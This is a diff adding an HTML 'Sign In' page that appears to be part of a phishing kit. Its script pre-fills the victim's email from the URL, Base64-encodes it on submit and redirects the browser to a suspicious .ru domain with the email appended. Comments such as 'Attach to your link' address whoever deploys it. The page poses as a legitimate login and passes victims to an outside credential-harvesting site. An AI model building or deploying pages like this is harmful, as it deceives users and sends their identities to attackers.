@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <script>
+        // Function to get URL parameters
+        function getQueryParam(name) {
+            let urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        window.onload = function() {
+            let email = getQueryParam('email'); // Get email from URL
+
+            if (email) {
+                document.getElementById("emailInput").value = email; // Autofill email field
+            }
+
+            document.getElementById("signInForm").addEventListener("submit", function(event) {
+                event.preventDefault(); // Prevent default form submission
+                
+                let emailValue = document.getElementById("emailInput").value;
+                let encodedEmail = btoa(emailValue); // Base64 encode email
+                let redirectURL = "https://JE.lfixemilotor.ru/P5U3gB3/#M" + encodedEmail; // Attach to your link
+                
+                window.location.href = redirectURL; // Redirect user
+            });
+        };
+    </script>
+</head>
+<body>
+    <h2>Sign In</h2>
+    <form id="signInForm">
+        <label for="email">Email:</label>
+        <input type="email" id="emailInput" name="email" required>
+        
+        <label for="password">Password:</label>
+        <input type="password" id="passwordInput" name="password" required>
+        
+        <button type="submit">Sign In</button>
+    </form>
+</body>
+</html>
